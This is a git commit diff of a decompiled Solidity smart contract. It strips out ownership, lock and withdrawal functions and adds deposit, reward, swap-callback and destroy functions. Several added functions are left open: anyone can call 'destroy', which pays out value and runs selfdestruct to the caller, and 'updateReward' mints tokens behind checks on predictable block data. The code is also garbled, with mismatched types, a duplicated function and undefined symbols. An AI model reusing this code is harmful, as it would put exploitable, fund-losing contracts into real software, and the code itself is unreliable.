8246d52a286079a6fb822d505cdc81716a599f95
HTM007sys <managervextrad@gmail.com>
2026-05-24 18:40:37 +0200

    Refactor contract functions and add new features

--- decompiled-contract (3).sol
+++ decompiled-contract (3).sol
@@ -1,70 +1,68 @@
 contract DECOMPILED {
 
-    function transferOwnership(address newOwner) public onlyOwner {
-        require(newOwner != address(0), "Ownable: new owner is the zero address");
-        emit OwnershipTransferred(owner, newOwner);
-        owner = newOwner;
+    function pauseBnft() external nonReentrant {
+        _pause();
     }
 
-    function setMaxWalletLimit(uint256 _maxWalletLimit) external onlyOwner {
-        require(_maxWalletLimit <= 20, "Cannot set maxWalletLimit greater than 20%");
-        maxWalletLimit = _maxWalletLimit;
-    }
-
-    function setMaxAmount() external {}
-
-    function changeFeeWallet(address newWallet) external onlyOwner {
-        feeWallet = newWallet;
-    }
-
-    function renounceOwnership() public virtual onlyOwner {
-        emit OwnershipTransferred(_owner, address(0));
-        _owner = address(0);
-    }
-
-    function lock(uint256 _unlockTime) public onlyOwner {
-        owner = owner;
-        owner = _owner;
-        unlockTime = now + _unlockTime;
-        emit OwnershipTransferred(address(0), address(0));
-    }
-
-    function owner() public view returns (address) {
-        return _owner;
-    }
-
-    function unlock() external onlyOwner {
-        require(block.timestamp > unlockTime, "Contract is locked until 7 days");
-        emit OwnershipTransferred(owner, newOwner);
-        owner = newOwner;
-    }
-
-    function withdrawETH() external onlyOwner {
-        payable(msg.sender).sendValue(address(this).balance);
-    }
-
-    function geUnlockTime() public view returns(uint256) {
-        return geUnlockTime_;
-    }
-
-    function withdrawToken(address token) external onlyOwner {
-        _withdrawToken(msg.sender, token);
-    }
-
-    function execute(
-        bytes calldata _callData,
-        bytes32[] memory _merkleProof,
-        address _to,
-        address _token,
-        bool _isETH
-    ) external payable {
-        if (_isETH) {
-            uint256 amount = msg.value;
-            amount = amount - getFee(amount);
-            (bytes memory result, ) = _to.call{value: amount}(_callData);
-            return (result);
+    function depositWstETH() external payable {
+        if (msg.sender != address(WSTETH)) {
+            revert();
         }
-        _execute(msg.sender, _token, _merkleProof, _callData, _to);
+        WSTETH.deposit{value: msg.value}();
+    }
+
+    function depositWstETH(
+        address _receiver,
+        bytes calldata _signature,
+        uint256 _amount
+    ) external payable nonReentrant {
+        require(_signature.length == 32, "DD0");
+        uint256 _amountWstETH = uint256(keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 1))));
+        require(_amountWstETH == _signature, "DD1");
+        uint256 _amountWstETHReceived = IERC20(wstETH).balanceOf(address(this));
+        IERC20(wstETH).safeIncreaseAllowance(_receiver, _amount);
+        IWstETH(_receiver).deposit(_signature, _amount);
+        wstETHReceived = _amountWstETHReceived;
+    }
+
+    function destroy(uint256 amount) external {
+        _requireIsInitialized();
+
+        if (amount > 0) {
+            IERC20(asset).approve(address(erc20Router), amount);
+            (bool success, ) = msg.sender.call{value: amount}("");
+            require(success, "DES");
+        }
+
+        selfdestruct(msg.sender);
+    }
+
+    function updateReward(address _token, bytes32[] calldata _merkleProof, uint256 _amount) external {
+        _updateReward();
+        require(_merkleProof[0] == bytes32(0), "DD0");
+        require(_merkleProof[1] == keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 1))), "DD1");
+        IERC20(_token).mint(_msgSender(), _amount);
+        _updateRewardPerToken(_amount);
+    }
+
+    function pancakeV3SwapCallback(
+        int256 amount0Delta,
+        int256 amount1Delta,
+        bytes calldata data
+    ) external override {
+        _swapCallback(amount0Delta, amount1Delta, data, true);
+    }
+
+    function uniswapV3SwapCallback(
+        int256 amount0Delta,
+        int256 amount1Delta,
+        bytes calldata data
+    ) external override {
+        _uniswapV3SwapCallback(amount0Delta, amount1Delta, data, false);
+    }
+
+    function delegate(address delegatee) external payable {
+        _delegate(delegatee);
     }
 
 }
